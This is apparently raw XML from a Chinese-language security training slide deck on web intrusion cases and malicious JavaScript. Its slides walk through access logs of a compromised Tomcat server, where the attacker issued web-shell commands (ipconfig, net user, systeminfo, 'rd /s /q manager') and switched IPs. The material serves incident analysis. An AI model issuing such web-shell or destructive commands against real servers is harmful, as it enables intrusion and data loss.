                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="353690269"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="354110">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[19/Jul/2016:17:12:18</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/manager/html</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401</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2980808956"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="24906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admin</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[19/Jul/2016:17:13:05</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/manager/html</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3781571971"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39640094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0151"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="90151"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9015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90152"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="17" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="90152"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="18" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="90152"/>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51" grpId="0"/>
      <p:bldP spid="90152" grpId="0"/>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54B6BE-EB8B-1441-AD38-6CB7D3F12B51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="395536" y="69269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lang="en-US" altLang="zh-CN" sz="2800">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>入侵案例</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="3" name="表格 2"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1160399566"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="179512" y="1484784"/>
          <a:ext cx="8652544" cy="4693920"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:effectLst>
                  <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr" rotWithShape="0">
                    <a:prstClr val="black">
                      <a:alpha val="40000"/>
                    </a:prstClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1726846">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4042131130"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2569209">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4146659710"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="713377">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2130727413"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2710042">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="134609445"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="933070">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4090423193"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="209550">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访问</a:t>
                      </a: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时间</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METHOD</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URL</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状态码</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577485799"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="315516">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[19/Jul/2016:17:25:15</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/servlets/?dir=D%3A%5C&amp;cmd=ipconfig&amp;btnCommand=Execute</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350432654"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="62984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[19/Jul/2016:18:23:09</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/servlets/?dir=D%3A%5Cwuzhangai%5Capache-tomcat-7.0.47-wza%5Cwebapps%5Cservlets&amp;cmd=net+user&amp;btnCommand=Execute</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3790865819"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="62984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[20/Jul/2016:10:16:54</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/servlets/?dir=D%3A%5Cwuzhangai%5Capache-tomcat-7.0.47-wza%5Cwebapps%5Cservlets&amp;cmd=net+user&amp;btnCommand=Execute</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527133960"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="42029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[20/Jul/2016:11:17:23</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/servlets/?dir=C%3A%5C&amp;cmd=netstat+-ano&amp;btnCommand=Execute</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3775059193"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="62984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[20/Jul/2016:12:08:33</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/servlets/?dir=D%3A%5Capache-tomcat-6.0.36-ssl-baosong%5Cconf&amp;cmd=systeminfo&amp;btnCommand=Execute</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3628125523"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="62984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[20/Jul/2016:12:10:10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/servlets/?dir=D%3A%5Capache-tomcat-6.0.36-ssl-baosong%5Cconf&amp;cmd=cpu+get+*&amp;btnCommand=Execute</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3298589255"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1583165688"/>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11D88E-9000-6842-9ECA-C0CAB5D00DC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568"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lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>入侵案例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93186" name="矩形 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="827584" y="1716626"/>
            <a:ext cx="6993730"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buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Step5: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>判断黑客切换IP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>首次攻击IP为110.90.61.182，另一IP为110.90.61.205 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="表格 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2189439164"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="391059" y="3212976"/>
          <a:ext cx="8280919" cy="2252857"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:effectLst>
                  <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr" rotWithShape="0">
                    <a:prstClr val="black">
                      <a:alpha val="40000"/>
                    </a:prstClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1613398">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1696873014"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2400040">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="892661246"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="659621">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2527620633"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2674140">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3712388879"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="933720">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1361829445"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="750952">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访问</a:t>
                      </a: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时间</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METHOD</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URL</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状态码</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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3554281412"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="500635">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110.90.61.205</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN"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[20/Jul/2016:14:05:07</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/servlets/?dir=C:\</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394423883"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1001270">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110.90.61.205</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN"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[20/Jul/2016:14:05:17</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GET</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN"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/servlets/?dir=C%3A%5CProgram+Files+%28x86%29%5C</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200</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN"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639314"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32908365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3186"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="93186"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9318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6D5FDC-E94B-0C45-80F2-5D314756C6A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="78050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lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>入侵案例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94210" name="矩形 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="899592" y="1591333"/>
            <a:ext cx="6605588"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buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Step6: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>黑客删除漏洞，独占权限</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>删除Tomcat 控制台目录，防止别的黑客进入。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="表格 3"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2999045004"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="611560" y="3068960"/>
          <a:ext cx="8050087" cy="2194560"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:effectLst>
                  <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr" rotWithShape="0">
                    <a:prstClr val="black">
                      <a:alpha val="40000"/>
                    </a:prstClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1620875">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="286003795"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2546350">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4108582905"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="668256">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3678998564"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2411924">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2469013894"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="802682">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2899628518"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="49139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访问</a:t>
                      </a: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时间</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METHOD</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URL</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状态码</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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1922842135"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="90011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110.90.61.205</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN"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[20/Jul/2016:16:27:28</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/servlets/?dir=D%3A%5Cwuzhangai%5Capache-tomcat-7.0.47-wza%5Cwebapps&amp;cmd=rd%2Fs%2Fq+manager&amp;btnCommand=Execute</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200</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN"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934225246"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17496711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4210"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="94210"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="942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5C798F-15A3-1B49-9A06-352E804AC228}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="794148"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恶意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>JS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>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4" name="矩形 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{482CC0DD-FABC-4A4C-8CA3-022207F166E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1313325" y="2415715"/>
            <a:ext cx="2959894" cy="2246769"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>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r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>接到一客户反馈，网站被“挂马”了，现象是，直接在浏览器中输入域名，没问题，但通过百度搜索出来的网站，点击会跳转到博彩网站页面。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="96259"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3968" y="1340768"/>
            <a:ext cx="4286174" cy="419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48612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96259"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="96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74BF64-7EF3-424E-A96A-B8709CAB8251}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="607219" y="111474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恶意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>JS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>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 name="矩形 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{85F7B60B-5EF2-1742-8631-EB6E521D7C8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="607219" y="1791891"/>
            <a:ext cx="6886575" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
